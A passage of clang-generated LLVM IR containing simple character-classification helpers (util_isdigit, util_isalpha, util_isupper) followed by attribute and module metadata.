  %19 = phi i1 [ true, %10 ], [ true, %6 ], [ true, %1 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  ret i32 %20
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isdigit(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 48
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 57
  br label %10

10:                                               ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isalpha(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br i1 %9, label %20, label %10

10:                                               ; preds = %6, %1
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 97
  br i1 %13, label %14, label %18

14:                                               ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp sle i32 %16, 122
  br label %18

18:                                               ; preds = %14, %10
  %19 = phi i1 [ false, %10 ], [ %17, %14 ]
  br label %20

20:                                               ; preds = %18, %6
  %21 = phi i1 [ true, %6 ], [ %19, %18 ]
  %22 = zext i1 %21 to i32
  ret i32 %22
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isupper(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br label %10

10:                                               ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind }
attributes #5 = { nounwind readnone willreturn }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
